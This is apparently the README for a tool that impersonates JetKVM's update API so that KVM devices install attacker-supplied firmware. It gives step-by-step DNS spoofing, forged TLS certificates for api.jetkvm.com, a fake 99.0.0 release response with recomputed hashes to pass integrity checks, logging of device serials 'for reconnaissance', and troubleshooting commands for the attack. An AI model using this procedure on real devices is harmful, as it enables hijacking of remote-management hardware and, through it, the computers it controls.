# Fake Firmware Server for JetKVM

A Python HTTPS server that impersonates `api.jetkvm.com` to intercept and serve custom firmware to JetKVM devices during OTA updates.

## JetKVM Update Process

JetKVM devices use a two-step OTA update process:

### Step 1: Check for Updates
The device queries the JetKVM API to check for available updates:

```
GET https://api.jetkvm.com/releases?deviceId=<SERIAL>&prerelease=false
```

**Response (JSON):**
```json
{
  "appVersion": "0.4.8",
  "appUrl": "https://update.jetkvm.com/app/0.4.8/jetkvm_app",
  "appHash": "714f33432f17035e38d238bf376e98f3073e6cc2845d269ff617503d12d92bdd",
  "systemVersion": "0.2.5",
  "systemUrl": "https://update.jetkvm.com/system/0.2.5/system.tar",
  "systemHash": "2323463ea8652be767d94514e548f90dd61b1ebcc0fb1834d700fac5b3d88a35"
}
```

### Step 2: Download Firmware
If a newer version is available, the device downloads from the URLs in the API response:
- `jetkvm_app` from `https://update.jetkvm.com/app/<version>/jetkvm_app`
- `system.tar` from `https://update.jetkvm.com/system/<version>/system.tar`

The device verifies SHA256 hashes (appHash/systemHash) before installation.

### Step 3: Installation
- Application: Saved to `/userdata/jetkvm/jetkvm_app.update`, applied on reboot
- System: Processed via `rk_ota` utility

## How the Fake Server Works

```
┌─────────────┐     DNS Spoofed      ┌─────────────────┐
│   JetKVM    │ ──────────────────── │  MITM Router    │
│   Device    │  api.jetkvm.com      │  192.168.200.1  │
└─────────────┘  → 192.168.200.1     └─────────────────┘
       │                                     │
       │ 1. GET /releases?deviceId=XXX       │
       │ ──────────────────────────────────► │
       │                                     │
       │ 2. JSON: version=99.0.0, urls=...   │
       │ ◄────────────────────────────────── │
       │                                     │
       │ 3. GET /firmware/jetkvm_app         │
       │ ──────────────────────────────────► │
       │                                     │
       │ 4. [Custom firmware binary]         │
       │ ◄────────────────────────────────── │
       │                                     │
       ▼                                     │
  Device installs                            │
  custom firmware                            │
```

The fake server:
1. Responds to `/releases` with a high version number (99.0.0) to trigger update
2. Returns download URLs pointing to itself (not update.jetkvm.com)
3. Calculates correct SHA256 hashes for served files
4. Logs device serial numbers for reconnaissance

## Prerequisites

- DNS spoofing configured to redirect `api.jetkvm.com` to your server
- SSL certificate (see options below)
- Firmware file to serve

## Directory Structure

```
/home/paulda/src/mitm/
├── fake-firmware-server.py    # Main server script
├── fake-firmware-server.md    # This documentation
├── firmware/                  # Firmware files to serve
│   ├── jetkvm_app            # Application firmware
│   └── system.tar            # System update (optional)
├── server.crt                 # SSL certificate (you create)
└── server.key                 # SSL private key (you create)
```

## SSL Certificate Options

### Option 1: Self-Signed Certificate (Try First)

Many IoT devices have weak or no TLS certificate validation. Try this first:

```bash
openssl req -x509 -newkey rsa:4096 \
  -keyout server.key -out server.crt \
  -days 1 -nodes -subj "/CN=api.jetkvm.com"
```

If the device connects successfully, it doesn't validate certificates.

### Option 2: Custom CA with Signed Certificate

If the device validates certificates, you need to install your CA on the device.

**Generate CA and server certificate:**

```bash
# Generate CA
openssl req -x509 -newkey rsa:4096 \
  -keyout ca.key -out ca.crt \
  -days 365 -nodes -subj "/CN=MITM CA"

# Generate server certificate signing request
openssl req -newkey rsa:2048 -nodes \
  -keyout server.key -out server.csr \
  -subj "/CN=api.jetkvm.com"

# Sign server certificate with CA
openssl x509 -req -in server.csr \
  -CA ca.crt -CAkey ca.key -CAcreateserial \
  -out server.crt -days 1

# Cleanup
rm server.csr
```

**Install CA on JetKVM device (requires SSH access):**

```bash
# Copy CA to device
scp ca.crt root@<jetkvm-ip>:/usr/local/share/ca-certificates/

# Update certificate store on device
ssh root@<jetkvm-ip> update-ca-certificates
```

Note: The exact location and command may vary. Common locations:
- `/etc/ssl/certs/`
- `/usr/local/share/ca-certificates/`
- `/etc/pki/ca-trust/source/anchors/`

### Option 3: Certificate Pinning (Blocked)

If JetKVM uses certificate pinning (hardcoded certificate or public key), MITM is not possible without modifying the device firmware.

## Usage

### 1. Configure DNS Spoofing

Ensure `dns-spoof.conf` contains:

```
address=/api.jetkvm.com/192.168.200.1
```

Reload dnsmasq if the router is already running:

```bash
sudo killall -HUP dnsmasq
```

### 2. Prepare Firmware Files

Place firmware in the `firmware/` directory:

```bash
# Download real firmware for testing
curl -o firmware/jetkvm_app https://update.jetkvm.com/app/0.4.8/jetkvm_app
curl -o firmware/system.tar https://update.jetkvm.com/system/0.2.5/system.tar

# Or place your custom/modified firmware
cp /path/to/custom/firmware firmware/jetkvm_app
```

### 3. Generate SSL Certificate

```bash
openssl req -x509 -newkey rsa:4096 \
  -keyout server.key -out server.crt \
  -days 1 -nodes -subj "/CN=api.jetkvm.com"
```

### 4. Start the Server

```bash
sudo ./fake-firmware-server.py \
  --cert server.crt \
  --key server.key \
  --firmware-dir ./firmware \
  --app-version 99.0.0 \
  --system-version 99.0.0
```

### 5. Trigger Update on Device

Either:
- Wait for periodic update check (device checks automatically)
- Manually trigger via JetKVM web UI: Settings → Check for Update
- Reboot the device

### 6. Monitor Server Logs

The server logs all requests:

```
2024-12-04 14:30:00 - INFO - === UPDATE CHECK ===
2024-12-04 14:30:00 - INFO - Device ID: ABC123456789
2024-12-04 14:30:00 - INFO - Prerelease: False
2024-12-04 14:30:00 - INFO - Responding with version: 99.0.0
2024-12-04 14:30:01 - INFO - === FIRMWARE DOWNLOAD ===
2024-12-04 14:30:01 - INFO - File requested: jetkvm_app
2024-12-04 14:30:01 - INFO - Served file: ./firmware/jetkvm_app (1234567 bytes)
```

## Command Line Options

```
usage: fake-firmware-server.py [-h] --cert CERT --key KEY
                               [--firmware-dir FIRMWARE_DIR]
                               [--app-version APP_VERSION]
                               [--system-version SYSTEM_VERSION]
                               [--port PORT] [--host HOST]

Options:
  --cert CERT                 Path to SSL certificate file (required)
  --key KEY                   Path to SSL private key file (required)
  --firmware-dir DIR          Directory containing firmware files (default: ./firmware)
  --app-version VERSION       App firmware version to advertise (default: 99.0.0)
  --system-version VERSION    System firmware version to advertise (default: 99.0.0)
  --port PORT                 Port to listen on (default: 443)
  --host HOST                 Host to bind to (default: 0.0.0.0)
```

## API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/` | GET | Server info and available endpoints |
| `/releases` | GET | Returns firmware version and download URLs |
| `/app/<version>/jetkvm_app` | GET | Serves application firmware |
| `/system/<version>/system.tar` | GET | Serves system update tarball |

### GET /releases

**Query Parameters:**
- `deviceId` - Device serial number (logged for reconnaissance)
- `prerelease` - Boolean, whether to include pre-release versions

**Response:**
```json
{
  "appVersion": "99.0.0",
  "appUrl": "https://api.jetkvm.com/app/99.0.0/jetkvm_app",
  "appHash": "<calculated-sha256-hash>",
  "systemVersion": "99.0.0",
  "systemUrl": "https://api.jetkvm.com/system/99.0.0/system.tar",
  "systemHash": "<calculated-sha256-hash>"
}
```

Note: The `system*` fields are only included if `system.tar` exists in the firmware directory.
The `app*` fields are only included if `jetkvm_app` exists in the firmware directory.

## Troubleshooting

### Device doesn't connect to server

1. **Verify DNS spoofing is active:**
   ```bash
   # From another machine on the LAN
   nslookup api.jetkvm.com 192.168.200.1
   # Should return 192.168.200.1
   ```

2. **Check iptables isn't blocking port 443:**
   ```bash
   iptables -nL | grep 443
   ```

3. **Verify server is listening:**
   ```bash
   ss -tlnp | grep 443
   ```

### SSL certificate errors

1. **Check certificate is valid:**
   ```bash
   openssl x509 -in server.crt -text -noout | grep -A2 "Validity"
   ```

2. **Test with curl (ignoring cert validation):**
   ```bash
   curl -k https://192.168.200.1/releases?deviceId=test
   ```

3. **If device validates certs:** Install your CA on the device (see Option 2 above)

### Device downloads but doesn't install

1. **Verify SHA256 hash matches:**
   ```bash
   sha256sum firmware/jetkvm_app
   # Compare with hash in server response
   ```

2. **Check firmware file isn't corrupted:**
   ```bash
   file firmware/jetkvm_app
   ```

3. **Version number:** Device may not "upgrade" to certain versions. Try different version numbers.

### No requests in server log

1. Device may be caching DNS - reboot the device
2. Device may not be checking for updates - trigger manually via web UI
3. Network routing issue - verify device can reach 192.168.200.1

## Security Considerations

- The device verifies SHA256 hashes - the server calculates correct hashes automatically
- Some devices check version numbers and won't "downgrade" - use a high version like 99.0.0
- Certificate pinning would block this attack entirely
- Always test with legitimate firmware first before attempting modified firmware

## References

- [JetKVM OTA Updates Documentation](https://jetkvm.com/docs/advanced-usage/ota-updates)
- [JetKVM Cloud API Repository](https://github.com/jetkvm/cloud-api)
- [JetKVM Offline Updates Discussion](https://github.com/jetkvm/kvm/issues/96)
- [JetKVM Releases](https://github.com/jetkvm/kvm/releases)
